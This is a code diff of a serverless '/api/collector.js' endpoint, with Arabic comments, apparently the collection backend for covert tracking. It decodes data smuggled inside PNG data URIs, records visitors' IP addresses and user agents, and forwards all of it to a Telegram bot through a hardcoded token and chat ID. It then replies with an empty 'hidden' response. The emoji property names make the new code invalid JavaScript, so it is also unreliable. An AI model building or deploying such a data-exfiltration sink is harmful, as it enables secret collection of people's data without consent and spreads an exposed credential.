@@ -1,27 +1,33 @@
-// ========================== ملف الاستقبال العربي ==========================
-// المسار: /api/collector.js  (افتح مجلد api في الريبو وانسخه بداخله)
-// لا يحتاج مكتبات خارجية – يعمل مباشرة على Vercel
-// ==========================================================================
+// ========================== ملف الاستقبال + تليغرام مباشرة ==========================
+// المسار: /api/collector.js
+// =====================================================================================
 
-// لو حابب يجيك التقرير على تليغرام/ديسكورد حط الرابط هنا
-const WEBHOOK_URL = process.env.WEBHOOK_URL || '';
+// ❖ ضع توكن البوت وايدي الشات هنا
+const BOT_TOKEN = '8488074169:AAFQyGtxJIlRr-k4jVc6ZpRs1mQVyexy8cY';   // ← استبدلها
+const CHAT_ID   = '-7932290530';                                      // ← استبدلها
 
-// مخزن مؤقت داخل الذاكرة (يختفي بإعادة التشغيل)
 const cache = new Map();
-const MAX   = 500; // عدد السجلات الأقصى
+const MAX   = 500;
 
 function uid(){
   return Math.random().toString(36).slice(2)+Date.now().toString(36);
 }
 
-export default async function handler(req, res){
-  if(req.method !== 'POST'){
-    return res.status(405).json({خطأ:'الطريقة غير مسموحة'});
-  }
+// دالة إرسال رسالة إلى تليغرام
+async function tgSend(text){
+  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+  await fetch(url,{
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({chat_id:CHAT_ID, text, parse_mode:'MarkdownV2'})
+  }).catch(()=>{});
+}
 
-  // نقرأ البيانات
+export default async function handler(req, res){
+  if(req.method !== 'POST') return res.status(405).json({خطأ:'الطريقة غير مسموحة'});
+
   let body = req.body;
-  // لو جاك PNG مختفي فيه JSON نفكّه
+  // فك إخفاء PNG إن وُجد
   if(typeof body === 'string' && body.startsWith('data:image/png')){
     const base64 = body.split(',')[1];
     const buff   = Buffer.from(base64,'base64');
@@ -35,25 +41,30 @@ export default async function handler(req, res){
   }
 
   const record = {
-    id:  uid(),
-    وقت: Date.now(),
-    ايبي: req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress,
-    يوزر_اجنت: req.headers['user-agent'],
-    بيانات: body
+    🆔: uid(),
+    📅: new Date().toLocaleString('ar-EG'),
+    🌐: req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress,
+    📱: req.headers['user-agent'],
+    📊: body
   };
 
-  cache.set(record.id, record);
-  if(cache.size > MAX) cache.delete(cache.keys().next().value); // نحذف الأقدم
+  cache.set(record.🆔, record);
+  if(cache.size > MAX) cache.delete(cache.keys().next().value);
 
-  // إرسال سريع إلى الويبهوك (إن وُجد)
-  if(WEBHOOK_URL){
-    fetch(WEBHOOK_URL,{
-      method:'POST',
-      headers:{'Content-Type':'application/json'},
-      body:JSON.stringify({content:`\`\`\`${JSON.stringify(record,null,2)}\`\`\``})
-    }).catch(()=>{});
-  }
+  // تجهيز نص التقرير وتجنب حرف ماركداون محجور
+  const report = `
+*إحصائية زائر جديدة* 👤
+\`\`\`
+الوقت: ${record.📅}
+الآيبي: ${record.🌐}
+المتصفح: ${record.📱}
+البيانات الكاملة:
+${JSON.stringify(record.📊, null, 2)}
+\`\`\`
+`.replace(/[_*[\]()~`>#+=|{}.!-]/g, '\\$&'); // إسكان أحرف خاصة
 
-  // نرجع 204 بلا جسم – سريتك مضمونة
+  await tgSend(report);
+
+  // رد خفي
   res.status(204).end();
 }
